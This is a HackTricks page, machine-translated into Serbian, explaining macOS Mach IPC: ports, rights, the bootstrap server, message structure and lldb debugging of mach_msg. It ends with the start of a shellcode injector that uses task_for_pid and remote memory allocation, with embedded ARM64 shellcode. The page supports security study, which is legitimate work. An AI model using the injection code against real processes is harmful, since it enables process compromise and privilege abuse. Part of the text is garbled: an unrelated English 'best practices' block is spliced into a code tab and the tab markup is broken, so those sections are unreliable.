# macOS IPC - Inter Process Communication

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili da **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJATELJSTVO**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**Porodiču PEASS**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## Mach poruke putem Portova

### Osnovne informacije

Mach koristi **taskove** kao **najmanju jedinicu** za deljenje resursa, i svaki task može sadržati **više niti**. Ovi **taskovi i niti su mapirani 1:1 na POSIX procese i niti**.

Komunikacija između taskova se odvija putem Mach Inter-Process Communication (IPC), koristeći jednosmjerne komunikacione kanale. **Poruke se prenose između portova**, koji deluju kao vrste **redova poruka** upravljanih od strane jezgra.

**Port** je **osnovni** element Mach IPC-a. Može se koristiti za **slanje poruka i za njihovo primanje**.

Svaki proces ima **IPC tabelu**, u kojoj je moguće pronaći **mach portove procesa**. Ime mach porta zapravo predstavlja broj (pokazivač na jezgrovni objekat).

Proces takođe može poslati ime porta sa određenim pravima **drugom tasku** i jezgro će napraviti ovaj unos u **IPC tabeli drugog taska**.

### Prava Porta

Prava porta, koja definišu koje operacije task može izvršiti, ključna su za ovu komunikaciju. Moguća **prava porta** su ([definicije odavde](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)):

* **Pravo primanja**, koje omogućava primanje poruka poslatih portu. Mach portovi su MPSC (multiple-producer, single-consumer) redovi, što znači da može postojati samo **jedno pravo primanja za svaki port** u celom sistemu (za razliku od cevi, gde više procesa može držati deskriptore fajlova za čitanje sa jednog kraja cevi).
* Task sa **Pravom primanja** može primati poruke i **kreirati Prava slanja**, omogućavajući mu slanje poruka. Originalno samo **sopstveni task ima Pravo primanja nad svojim portom**.
* Ako vlasnik Prava primanja **umre** ili ga ubije, **pravo slanja postaje beskorisno (mrtvo ime)**.
* **Pravo slanja**, koje omogućava slanje poruka portu.
* Pravo slanja se može **klonirati** tako da task koji poseduje Pravo slanja može klonirati pravo i **dodeliti ga trećem tasku**.
* Imajte na umu da se **prava porta** takođe mogu **prosleđivati** putem Mac poruka.
* **Pravo slanja jednom**, koje omogućava slanje jedne poruke portu i zatim nestaje.
* Ovo pravo **ne može** biti **klonirano**, ali se može **premestiti**.
* **Pravo skupa portova**, koje označava _skup portova_ umesto jednog porta. Izvlačenje poruke iz skupa portova izvlači poruku iz jednog od portova koje sadrži. Skupovi portova se mogu koristiti za osluškivanje više portova istovremeno, slično kao `select`/`poll`/`epoll`/`kqueue` u Unix-u.
* **Mrtvo ime**, koje nije stvarno pravo porta, već samo oznaka. Kada se port uništi, sva postojeća prava porta na port postaju mrtva imena.

**Taskovi mogu preneti SEND prava drugima**, omogućavajući im da pošalju poruke nazad. **SEND prava takođe mogu biti klonirana, tako da task može duplicirati pravo i dati ga trećem tasku**. Ovo, zajedno sa posredničkim procesom poznatim kao **bootstrap server**, omogućava efikasnu komunikaciju između taskova.

### Portovi Fajlova

Portovi fajlova omogućavaju da se deskriptori fajlova enkapsuliraju u Mac portove (koristeći Mach prava porta). Moguće je kreirati `fileport` od datog FD koristeći `fileport_makeport` i kreirati FD iz fileporta koristeći `fileport_makefd`.

### Uspostavljanje komunikacije

Kao što je ranije pomenuto, moguće je slati prava korišćenjem Mach poruka, međutim, **ne možete poslati pravo bez već postojećeg prava** za slanje Mach poruke. Kako se onda uspostavlja prva komunikacija?

Za to je uključen **bootstrap server** (**launchd** na Mac-u), pošto **svako može dobiti SEND pravo ka bootstrap serveru**, moguće je zatražiti od njega pravo da pošalje poruku drugom procesu:

1. Task **A** kreira **novi port**, dobijajući **PRIMI right** nad njim.
2. Task **A**, kao vlasnik PRIMI prava, **generiše SEND pravo za port**.
3. Task **A** uspostavlja **vezu** sa **bootstrap serverom**, i **šalje mu SEND pravo** za port koji je generisao na početku.
* Zapamtite da svako može dobiti SEND pravo ka bootstrap serveru.
4. Task A šalje `bootstrap_register` poruku bootstrap serveru da **poveže dati port sa imenom** kao što je `com.apple.taska`
5. Task **B** interaguje sa **bootstrap serverom** da izvrši bootstrap **pretragu za servisnim** imenom (`bootstrap_lookup`). Da bi bootstrap server mogao da odgovori, task B će mu poslati **SEND pravo ka portu koji je prethodno kreirao** unutar pretrage poruke. Ako je pretraga uspešna, **server duplira SEND pravo** primljeno od Task A i **prebacuje ga Task B**.
* Zapamtite da svako može dobiti SEND pravo ka bootstrap serveru.
6. Sa ovim SEND pravom, **Task B** je sposoban da **pošalje** **poruku** **Task A**-i.
7. Za dvosmernu komunikaciju obično task **B** generiše novi port sa **PRIMI** pravom i **SEND** pravom, i daje **SEND pravo Task A**-i tako da može slati poruke TASK B-u (dvosmerna komunikacija).

Bootstrap server **ne može autentifikovati** ime servisa koje tvrdi task. Ovo znači da bi **task** potencijalno mogao **predstavljati bilo koji sistemski task**, kao što je lažno **tvrditi ime servisa za autorizaciju** a zatim odobravati svaki zahtev.

Zatim, Apple čuva **imena sistema pruženih servisa** u sigurnim konfiguracionim fajlovima, smeštenim u **SIP-zaštićenim** direktorijumima: `/System/Library/LaunchDaemons` i `/System/Library/LaunchAgents`. Pored svakog imena servisa, takođe je sačuvana i **povezana binarna datoteka**. Bootstrap server će kreirati i držati **PRIMI pravo za svako od ovih imena servisa**.

Za ove unapred definisane servise, **proces pretrage se malo razlikuje**. Kada se traži ime servisa, launchd pokreće servis dinamički. Novi tok rada je sledeći:

* Task **B** pokreće bootstrap **pretragu** za imenom servisa.
* **launchd** proverava da li je task pokrenut i ako nije, ga **pokreće**.
* Task **A** (servis) izvršava **bootstrap check-in** (`bootstrap_check_in()`). Ovde, **bootstrap** server kreira SEND pravo, zadržava ga, i **prebacuje PRIMI pravo Task A**-i.
* launchd duplira **SEND pravo i šalje ga Task B**-u.
* Task **B** generiše novi port sa **PRIMI** pravom i **SEND** pravom, i daje **SEND pravo Task A**-i (servisu) tako da može slati poruke TASK B-u (dvosmerna komunikacija).

Međutim, ovaj proces se odnosi samo na unapred definisane sistemski taskove. Ne-sistemski taskovi i dalje funkcionišu kao što je opisano originalno, što potencijalno može omogućiti predstavljanje.

{% hint style="opasnost" %}
Stoga, launchd nikada ne bi trebalo da se sruši ili će ceo sistem pasti.
{% endhint %}
### Mach poruka

[Pronađi više informacija ovde](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)

Funkcija `mach_msg`, suštinski sistemski poziv, koristi se za slanje i primanje Mach poruka. Funkcija zahteva da poruka bude poslata kao početni argument. Ova poruka mora početi sa strukturom `mach_msg_header_t`, praćenom stvarnim sadržajem poruke. Struktura je definisana na sledeći način:
```c
typedef struct {
mach_msg_bits_t               msgh_bits;
mach_msg_size_t               msgh_size;
mach_port_t                   msgh_remote_port;
mach_port_t                   msgh_local_port;
mach_port_name_t              msgh_voucher_port;
mach_msg_id_t                 msgh_id;
} mach_msg_header_t;
```
Procesi koji poseduju _**pravo na prijem**_ mogu primati poruke na Mach portu. Nasuprot tome, **pošiljaoci** dobijaju _**slanje**_ ili _**jednokratno slanje prava**_. Pravo jednokratnog slanja je isključivo za slanje jedne poruke, nakon čega postaje nevažeće.

Početno polje **`msgh_bits`** je mapa bitova:

- Prvi bit (najznačajniji) se koristi da označi da je poruka složena (više o tome ispod)
- 3. i 4. bit se koriste od strane jezgra
- **5 najmanje značajnih bitova 2. bajta** mogu se koristiti za **vaučer**: druga vrsta porta za slanje kombinacija ključ/vrednost.
- **5 najmanje značajnih bitova 3. bajta** mogu se koristiti za **lokalni port**
- **5 najmanje značajnih bitova 4. bajta** mogu se koristiti za **udaljeni port**

Tipovi koji se mogu navesti u vaučeru, lokalnim i udaljenim portovima su (iz [**mach/message.h**](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html)):
```c
#define MACH_MSG_TYPE_MOVE_RECEIVE      16      /* Must hold receive right */
#define MACH_MSG_TYPE_MOVE_SEND         17      /* Must hold send right(s) */
#define MACH_MSG_TYPE_MOVE_SEND_ONCE    18      /* Must hold sendonce right */
#define MACH_MSG_TYPE_COPY_SEND         19      /* Must hold send right(s) */
#define MACH_MSG_TYPE_MAKE_SEND         20      /* Must hold receive right */
#define MACH_MSG_TYPE_MAKE_SEND_ONCE    21      /* Must hold receive right */
#define MACH_MSG_TYPE_COPY_RECEIVE      22      /* NOT VALID */
#define MACH_MSG_TYPE_DISPOSE_RECEIVE   24      /* must hold receive right */
#define MACH_MSG_TYPE_DISPOSE_SEND      25      /* must hold send right(s) */
#define MACH_MSG_TYPE_DISPOSE_SEND_ONCE 26      /* must hold sendonce right */
```
Na primer, `MACH_MSG_TYPE_MAKE_SEND_ONCE` može se koristiti da **ukazuje** da bi trebalo izvesti i preneti **jednokratno slanje prava** za ovaj port. Takođe se može specificirati `MACH_PORT_NULL` da bi se sprečilo da primalac može da odgovori.

Da bi se postigla jednostavna **dvosmerna komunikacija**, proces može specificirati **mach port** u mach **zaglavlju poruke** nazvan _reply port_ (**`msgh_local_port`**) gde **primalac** poruke može **poslati odgovor** na ovu poruku.

{% hint style="success" %}
Imajte na umu da se ovakva vrsta dvosmerne komunikacije koristi u XPC porukama koje očekuju odgovor (`xpc_connection_send_message_with_reply` i `xpc_connection_send_message_with_reply_sync`). Ali **obično se kreiraju različiti portovi** kako je objašnjeno ranije da bi se kreirala dvosmerna komunikacija.
{% endhint %}

Ostala polja zaglavlja poruke su:

- `msgh_size`: veličina celog paketa.
- `msgh_remote_port`: port preko kog je poslata ova poruka.
- `msgh_voucher_port`: [mach vaučeri](https://robert.sesek.com/2023/6/mach\_vouchers.html).
- `msgh_id`: ID ove poruke, koji se tumači od strane primaoca.

{% hint style="danger" %}
Imajte na umu da se **mach poruke šalju preko `mach porta`**, koji je **kanal komunikacije sa jednim primaocem**, **više pošiljalaca** ugrađen u mach kernel. **Više procesa** može **slati poruke** ka mach portu, ali u svakom trenutku samo **jedan proces može čitati** iz njega.
{% endhint %}

Poruke se zatim formiraju **`mach_msg_header_t`** zaglavljem praćenim **telom** i **trailerom** (ako postoji) i može dozvoliti odgovor na nju. U tim slučajevima, kernel samo treba da prosledi poruku od jednog zadatka drugom.

**Trailer** je **informacija dodata poruci od strane kernela** (ne može je postaviti korisnik) koja se može zatražiti prilikom prijema poruke sa zastavicom `MACH_RCV_TRAILER_<trailer_opt>` (postoji različite informacije koje se mogu zatražiti).

#### Kompleksne Poruke

Međutim, postoje i druge više **kompleksne** poruke, poput onih koje prenose dodatna prava porta ili dele memoriju, gde kernel takođe mora da pošalje ove objekte primaocu. U ovim slučajevima, najznačajniji bit zaglavlja `msgh_bits` je postavljen.

Mogući deskriptori za prenos su definisani u [**`mach/message.h`**](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html):
```c
#define MACH_MSG_PORT_DESCRIPTOR                0
#define MACH_MSG_OOL_DESCRIPTOR                 1
#define MACH_MSG_OOL_PORTS_DESCRIPTOR           2
#define MACH_MSG_OOL_VOLATILE_DESCRIPTOR        3
#define MACH_MSG_GUARDED_PORT_DESCRIPTOR        4

#pragma pack(push, 4)

typedef struct{
natural_t                     pad1;
mach_msg_size_t               pad2;
unsigned int                  pad3 : 24;
mach_msg_descriptor_type_t    type : 8;
} mach_msg_type_descriptor_t;
```
U 32-bitnom režimu, svi deskriptori su 12B i tip deskriptora je u 11-tom. U 64-bitnom režimu, veličine variraju.

{% hint style="opasnost" %}
Kernel će kopirati deskriptore iz jednog zadatka u drugi, ali prvo **kreira kopiju u jezgrovnoj memoriji**. Ova tehnika, poznata kao "Feng Shui", zloupotrebljena je u nekoliko eksploatacija kako bi naterala **kernel da kopira podatke u svojoj memoriji**, omogućavajući procesu da pošalje deskriptore sebi. Zatim proces može primati poruke (kernel će ih osloboditi).

Takođe je moguće **poslati prava porta ranjivom procesu**, i prava porta će se jednostavno pojaviti u procesu (čak i ako ih ne obrađuje).
{% endhint %}

### Mac Ports API-ji

Imajte na umu da su portovi povezani sa imenikom zadatka, pa prilikom kreiranja ili pretrage porta, takođe se pretražuje imenik zadatka (više u `mach/mach_port.h`):

* **`mach_port_allocate` | `mach_port_construct`**: **Kreirajte** port.
* `mach_port_allocate` takođe može kreirati **skup portova**: primi pravo nad grupom portova. Svaki put kada se primi poruka, naznačen je port sa kog je poslata.
* `mach_port_allocate_name`: Promenite ime porta (podrazumevano 32-bitni ceo broj)
* `mach_port_names`: Dobijte imena portova iz cilja
* `mach_port_type`: Dobijte prava zadatka nad imenom
* `mach_port_rename`: Preimenujte port (kao dup2 za FD-ove)
* `mach_port_allocate`: Alocirajte novi PRIMI, PORT_SET ili DEAD_NAME
* `mach_port_insert_right`: Kreirajte novo pravo u portu gde imate PRIMI
* `mach_port_...`
* **`mach_msg`** | **`mach_msg_overwrite`**: Funkcije korišćene za **slanje i primanje mach poruka**. Verzija za prepisivanje omogućava da se navede drugi bafer za prijem poruke (druga verzija će ga jednostavno ponovo koristiti).

### Debugovanje mach\_msg

Pošto su funkcije **`mach_msg`** i **`mach_msg_overwrite`** one koje se koriste za slanje i primanje poruka, postavljanje prekidača na njih omogućilo bi inspekciju poslatih i primljenih poruka.

Na primer, počnite sa debugovanjem bilo koje aplikacije koju možete da debugujete jer će učitati **`libSystem.B` koja će koristiti ovu funkciju**.

<pre class="language-armasm"><code class="lang-armasm"><strong>(lldb) b mach_msg
</strong>Prekid 1: gde = libsystem_kernel.dylib`mach_msg, adresa = 0x00000001803f6c20
<strong>(lldb) r
</strong>Proces 71019 pokrenut: '/Users/carlospolop/Desktop/sandboxedapp/SandboxedShellAppDown.app/Contents/MacOS/SandboxedShellApp' (arm64)
Proces 71019 zaustavljen
* nit #1, red = 'com.apple.main-thread', razlog zaustavljanja = prekid 1.1
okvir #0: 0x0000000181d3ac20 libsystem_kernel.dylib`mach_msg
libsystem_kernel.dylib`mach_msg:
->  0x181d3ac20 &#x3C;+0>:  pacibsp
0x181d3ac24 &#x3C;+4>:  sub    sp, sp, #0x20
0x181d3ac28 &#x3C;+8>:  stp    x29, x30, [sp, #0x10]
0x181d3ac2c &#x3C;+12>: add    x29, sp, #0x10
Cilj 0: (SandboxedShellApp) zaustavljen.
<strong>(lldb) bt
</strong>* nit #1, red = 'com.apple.main-thread', razlog zaustavljanja = prekid 1.1
* okvir #0: 0x0000000181d3ac20 libsystem_kernel.dylib`mach_msg
okvir #1: 0x0000000181ac3454 libxpc.dylib`_xpc_pipe_mach_msg + 56
okvir #2: 0x0000000181ac2c8c libxpc.dylib`_xpc_pipe_routine + 388
okvir #3: 0x0000000181a9a710 libxpc.dylib`_xpc_interface_routine + 208
okvir #4: 0x0000000181abbe24 libxpc.dylib`_xpc_init_pid_domain + 348
okvir #5: 0x0000000181abb398 libxpc.dylib`_xpc_uncork_pid_domain_locked + 76
okvir #6: 0x0000000181abbbfc libxpc.dylib`_xpc_early_init + 92
okvir #7: 0x0000000181a9583c libxpc.dylib`_libxpc_initializer + 1104
okvir #8: 0x000000018e59e6ac libSystem.B.dylib`libSystem_initializer + 236
okvir #9: 0x0000000181a1d5c8 dyld`invocation function for block in dyld4::Loader::findAndRunAllInitializers(dyld4::RuntimeState&#x26;) const::$_0::operator()() const + 168
</code></pre>

Da biste dobili argumente **`mach_msg`**, proverite registre. Ovo su argumenti (iz [mach/message.h](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html)):
```c
__WATCHOS_PROHIBITED __TVOS_PROHIBITED
extern mach_msg_return_t        mach_msg(
mach_msg_header_t *msg,
mach_msg_option_t option,
mach_msg_size_t send_size,
mach_msg_size_t rcv_size,
mach_port_name_t rcv_name,
mach_msg_timeout_t timeout,
mach_port_name_t notify);
```
Dobijanje vrednosti iz registara:
```armasm
reg read $x0 $x1 $x2 $x3 $x4 $x5 $x6
x0 = 0x0000000124e04ce8 ;mach_msg_header_t (*msg)
x1 = 0x0000000003114207 ;mach_msg_option_t (option)
x2 = 0x0000000000000388 ;mach_msg_size_t (send_size)
x3 = 0x0000000000000388 ;mach_msg_size_t (rcv_size)
x4 = 0x0000000000001f03 ;mach_port_name_t (rcv_name)
x5 = 0x0000000000000000 ;mach_msg_timeout_t (timeout)
x6 = 0x0000000000000000 ;mach_port_name_t (notify)
```
Pregledajte zaglavlje poruke proveravajući prvi argument:
```armasm
(lldb) x/6w $x0
0x124e04ce8: 0x00131513 0x00000388 0x00000807 0x00001f03
0x124e04cf8: 0x00000b07 0x40000322

; 0x00131513 -> mach_msg_bits_t (msgh_bits) = 0x13 (MACH_MSG_TYPE_COPY_SEND) in local | 0x1500 (MACH_MSG_TYPE_MAKE_SEND_ONCE) in remote | 0x130000 (MACH_MSG_TYPE_COPY_SEND) in voucher
; 0x00000388 -> mach_msg_size_t (msgh_size)
; 0x00000807 -> mach_port_t (msgh_remote_port)
; 0x00001f03 -> mach_port_t (msgh_local_port)
; 0x00000b07 -> mach_port_name_t (msgh_voucher_port)
; 0x40000322 -> mach_msg_id_t (msgh_id)
```
Taj tip `mach_msg_bits_t` je vrlo čest kako bi omogućio odgovor.



### Nabroj portove
```bash
lsmp -p <pid>

sudo lsmp -p 1
Process (1) : launchd
name      ipc-object    rights     flags   boost  reqs  recv  send sonce oref  qlimit  msgcount  context            identifier  type
---------   ----------  ----------  -------- -----  ---- ----- ----- ----- ----  ------  --------  ------------------ ----------- ------------
0x00000203  0x181c4e1d  send        --------        ---            2                                                  0x00000000  TASK-CONTROL SELF (1) launchd
0x00000303  0x183f1f8d  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x00000403  0x183eb9dd  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x0000051b  0x1840cf3d  send        --------        ---            2        ->        6         0  0x0000000000000000 0x00011817  (380) WindowServer
0x00000603  0x183f698d  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x0000070b  0x175915fd  recv,send   ---GS---     0  ---      1     2         Y        5         0  0x0000000000000000
0x00000803  0x1758794d  send        --------        ---            1                                                  0x00000000  CLOCK
0x0000091b  0x192c71fd  send        --------        D--            1        ->        1         0  0x0000000000000000 0x00028da7  (418) runningboardd
0x00000a6b  0x1d4a18cd  send        --------        ---            2        ->       16         0  0x0000000000000000 0x00006a03  (92247) Dock
0x00000b03  0x175a5d4d  send        --------        ---            2        ->       16         0  0x0000000000000000 0x00001803  (310) logd
[...]
0x000016a7  0x192c743d  recv,send   --TGSI--     0  ---      1     1         Y       16         0  0x0000000000000000
+     send        --------        ---            1         <-                                       0x00002d03  (81948) seserviced
+     send        --------        ---            1         <-                                       0x00002603  (74295) passd
[...]
```
**Ime** je podrazumevano ime dodeljeno portu (proverite kako se **povećava** u prva 3 bajta). **`ipc-object`** je **zamagljeni** jedinstveni **identifikator** porta.\
Takođe obratite pažnju kako portovi sa samo **`send`** pravom **identifikuju vlasnika** (ime porta + pid).\
Takođe obratite pažnju na upotrebu **`+`** za označavanje **drugih zadataka povezanih sa istim portom**.

Takođe je moguće koristiti [**procesxp**](https://www.newosxbook.com/tools/procexp.html) da biste videli i **registrovana imena servisa** (sa onemogućenim SIP-om zbog potrebe za `com.apple.system-task-port`):
```
procesp 1 ports
```
Možete instalirati ovaj alat u iOS preuzimanjem sa [http://newosxbook.com/tools/binpack64-256.tar.gz](http://newosxbook.com/tools/binpack64-256.tar.gz)

### Primer koda

Obratite pažnju kako **pošiljalac** **dodeljuje** port, kreira **send right** za ime `org.darlinghq.example` i šalje ga **bootstrap serveru** dok je pošiljalac zatražio **send right** za to ime i koristio ga je da **pošalje poruku**.

{% tabs %}
{% tab title="receiver.c" %}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc receiver.c -o receiver

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Create a new port.
mach_port_t port;
kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
if (kr != KERN_SUCCESS) {
printf("mach_port_allocate() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_allocate() created port right name %d\n", port);


// Give us a send right to this port, in addition to the receive right.
kr = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
if (kr != KERN_SUCCESS) {
printf("mach_port_insert_right() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_insert_right() inserted a send right\n");


// Send the send right to the bootstrap server, so that it can be looked up by other processes.
kr = bootstrap_register(bootstrap_port, "org.darlinghq.example", port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_register() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_register()'ed our port\n");


// Wait for a message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
mach_msg_trailer_t trailer;
} message;

kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_RCV_MSG,     // Options. We're receiving a message.
0,                // Size of the message being sent, if sending.
sizeof(message),  // Size of the buffer for receiving.
port,             // The port to receive a message on.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Got a message\n");

message.some_text[9] = 0;
printf("Text: %s, number: %d\n", message.some_text, message.some_number);
}
```
{% endtab %}

{% tab title="sender.c" %}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc sender.c -o sender

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Lookup the receiver port using the bootstrap server.
mach_port_t port;
kern_return_t kr = bootstrap_look_up(bootstrap_port, "org.darlinghq.example", &port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_look_up() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_look_up() returned port right name %d\n", port);


// Construct our message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
} message;

message.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
message.header.msgh_remote_port = port;
message.header.msgh_local_port = MACH_PORT_NULL;

strncpy(message.some_text, "Hello", sizeof(message.some_text));
message.some_number = 35;

// Send the message.
kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_SEND_MSG,    // Options. We're sending a message.
sizeof(message),  // Size of the message being sent.
0,                // Size of the buffer for receiving.
MACH_PORT_NULL,   // A port to receive a message on, if receiving.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Sent a message\n");
}
```
{% endtab %}
{% endtabs %}

### Privilegovani portovi

* **Port domaćina**: Ako proces ima **Send** privilegiju nad ovim portom, može dobiti **informacije** o **sistemu** (npr. `host_processor_info`).
* **Privilegovani port domaćina**: Proces sa **Send** pravom nad ovim portom može izvršiti **privilegovane radnje** poput učitavanja kernel ekstenzije. **Proces mora biti root** da bi dobio ovu dozvolu.
* Osim toga, da bi pozvao **`kext_request`** API, potrebno je imati druge dozvole **`com.apple.private.kext*`** koje su date samo Apple binarnim fajlovima.
* **Port naziva zadatka:** Neprivilegovana verzija _ports zadatka_. Referiše na zadatak, ali ne dozvoljava kontrolisanje istog. Jedina stvar koja se čini dostupnom kroz njega je `task_info()`.
* **Port zadatka** (poznat i kao kernel port)**:** Sa Send dozvolom nad ovim portom moguće je kontrolisati zadatak (čitanje/pisanje memorije, kreiranje niti...).
* Pozovi `mach_task_self()` da **dobiješ naziv** za ovaj port za pozivaoca zadatka. Ovaj port se nasleđuje samo preko **`exec()`**; novi zadatak kreiran sa `fork()` dobija novi port zadatka (kao poseban slučaj, zadatak takođe dobija novi port zadatka nakon `exec()` u suid binarnom fajlu). Jedini način da pokreneš zadatak i dobiješ njegov port je da izvedeš ["port swap dance"](https://robert.sesek.com/2014/1/changes\_to\_xnu\_mach\_ipc.html) dok radiš `fork()`.
* Ovo su ograničenja za pristup portu (iz `macos_task_policy` iz binarnog fajla `AppleMobileFileIntegrity`):
* Ako aplikacija ima **`com.apple.security.get-task-allow` dozvolu** procesi od **istog korisnika mogu pristupiti portu zadatka** (obično dodato od strane Xcode-a za debagovanje). Proces notarizacije neće dozvoliti ovo za produkcijska izdanja.
* Aplikacije sa dozvolom **`com.apple.system-task-ports`** mogu dobiti **port zadatka za bilo** koji proces, osim kernela. U starijim verzijama se nazivalo **`task_for_pid-allow`**. Ovo je dato samo Apple aplikacijama.
* **Root može pristupiti portovima zadatka** aplikacija **koje nisu** kompajlirane sa **hardened** izvršnom datotekom (i ne od strane Apple-a).

### Ubacivanje shell koda u nit putem porta zadatka

Možeš dohvatiti shell kod sa:

{% content-ref url="../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md" %}
[arm64-basic-assembly.md](../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md)
{% endcontent-ref %}
```objectivec
// clang -framework Foundation mysleep.m -o mysleep
// codesign --entitlements entitlements.plist -s - mysleep

#import <Foundation/Foundation.h>

double performMathOperations() {
double result = 0;
for (int i = 0; i < 10000; i++) {
result += sqrt(i) * tan(i) - cos(i);
}
return result;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
NSLog(@"Process ID: %d", [[NSProcessInfo processInfo]
processIdentifier]);
while (true) {
[NSThread sleepForTimeInterval:5];

performMathOperations();  // Silent action

[NSThread sleepForTimeInterval:5];
}
}
return 0;
}
```
{% endtab %}

{% tab title="entitlements.plist" %} 

## macOS IPC - Inter-Process Communication

### macOS Inter-Process Communication (IPC)

Inter-Process Communication (IPC) is a set of methods for the exchange of data among multiple threads in one or more processes. macOS provides several IPC mechanisms, including:

- **Mach Messages**: Low-level messaging system used by macOS for inter-process communication.
- **XPC Services**: A high-level API for implementing inter-process communication.

### macOS IPC Abuse

Abusing IPC mechanisms can lead to privilege escalation and other security issues on macOS systems. Attackers can exploit insecure IPC configurations to gain elevated privileges and execute malicious code.

### Protecting Against IPC Abuse

To protect against IPC abuse, follow these best practices:

- **Implement Proper Entitlements**: Use entitlements to restrict access to IPC mechanisms based on the principle of least privilege.
- **Secure IPC Configurations**: Ensure that IPC configurations are properly secured to prevent unauthorized access.
- **Monitor IPC Activity**: Monitor IPC activity for any suspicious behavior that could indicate abuse of IPC mechanisms.

By following these best practices, you can help secure your macOS system against IPC abuse and potential privilege escalation attacks.

{% endtab %}
```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.get-task-allow</key>
<true/>
</dict>
</plist>
```
{% endtab %}
{% endtabs %}

**Kompajlujte** prethodni program i dodajte **ovlašćenja** kako biste mogli da ubacite kod sa istim korisnikom (ako ne, moraćete koristiti **sudo**).

<details>

<summary>sc_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit sc_injector.m -o sc_injector

#import <Foundation/Foundation.h>
#import <AppKit/AppKit.h>
#include <mach/mach_vm.h>
#include <sys/sysctl.h>


#ifdef __arm64__

kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128

// ARM64 shellcode that executes touch /tmp/lalala
char injectedCode[] = "\xff\x03\x01\xd1\xe1\x03\x00\x91\x60\x01\x00\x10\x20\x00\x00\xf9\x60\x01\x00\x10\x20\x04\x00\xf9\x40\x01\x00\x10\x20\x08\x00\xf9\x3f\x0c\x00\xf9\x80\x00\x00\x10\xe2\x03\x1f\xaa\x70\x07\x80\xd2\x01\x00\x00\xd4\x2f\x62\x69\x6e\x2f\x73\x68\x00\x2d\x63\x00\x00\x74\x6f\x75\x63\x68\x20\x2f\x74\x6d\x70\x2f\x6c\x61\x6c\x61\x6c\x61\x00";


int inject(pid_t pid){

task_t remoteTask;

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
